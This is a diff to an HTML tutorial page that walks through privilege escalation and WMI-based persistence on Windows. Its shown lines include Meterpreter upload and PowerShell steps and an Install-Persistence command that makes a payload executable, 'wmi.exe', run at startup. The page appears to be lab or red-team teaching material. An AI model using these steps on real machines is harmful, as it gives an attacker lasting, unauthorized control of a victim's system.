@@ -2,7 +2,7 @@
     <meta name=”robots” content=”noindex,nofollow”/>
   <a href=../index.html>Back to home</a>
 <hr/>
-<h1>Privilege Escalation and Maintain Persistence using WMI</h1>
+<h1>Privilege Escalation and Maintain Persistence using <a target=_blank href=https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page>WMI</a></h1>
         <h2>Create malicious files</h2>
     <ol><p>
         <ul>sudo su</ul>
@@ -38,15 +38,12 @@
 <p><ol><ul>getuid</ul>
   <ul>upload /home/myusername/Wmi-Persistence-master C:\\Users\\Administrator\\Downloads</ul>
 </ol></p>
-  <h2>Upload <a target=_blank href=https://github.com/PowerShellEmpire/PowerTools>PowerTools</a></h2>
-  <p><ol><ul>upload -r /home/myusername/PowerTools-master C:\\Users\\Administrator\\Downloads</ul>
-  </ol></p>
     <h2>Powershell</h2>
     <p><ol><ul>
         load powershell
     </ul>
     <ul>powershell_shell</ul>
-    <ul>Import-Module ./WMI-Persistence.ps1 </ul>
+    <ul>Import-Module ./WMI-Persistence.ps1</ul>
     <ul>Install-Persistence -Trigger Startup -Payload “C:\Users\Administrator\Downloads\wmi.exe”</ul>
     </ol></p>
   <h2>Second console</h2>
